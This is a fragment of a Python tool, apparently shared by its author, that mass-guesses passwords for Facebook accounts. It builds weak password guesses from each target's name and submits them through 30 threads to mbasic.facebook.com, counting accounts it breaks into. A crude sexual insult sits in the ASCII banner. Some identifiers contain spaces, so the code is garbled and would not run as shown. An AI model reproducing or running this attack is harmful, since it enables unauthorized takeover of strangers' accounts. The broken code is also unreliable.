...
from concurrent.futures import ThreadPoolExecutor as BALOCH ZAMAN
...
\033[1;35m╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
                                                 I FUCK YOUR BAJI                            
                                                                                                ...
                                                                                                \x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37mZAMAN
\033[1;31m\033[1;37m Facebook\x1b[1;97m :  \033[1;37mZAMAN
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37mzamankhan12345
...
def hasil(ok,cp):
	...
	print(f' OK : %s '%(ok))
	print(f' CP : %s '%(cp))
	input('Press enter to back ZAMAN Menu ')
	BALOCH ()
...
def BALOCH ():
    ...
    print(' [E] exit ')
    print('')
    _BALOCH ___ = input(' [?] Choose option : ')
    if _BALOCH ___ in ('1', '01'):
        __xxx__().BALOCH x(id)
    if _BALOCH ___ in ('2', '02'):
        create_file()
    if _BALOCH ___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with BALOCH ZAMAN(max_workers=30) as ZAMANworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123", xz[0]+"1234"]
                        ZAMANworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
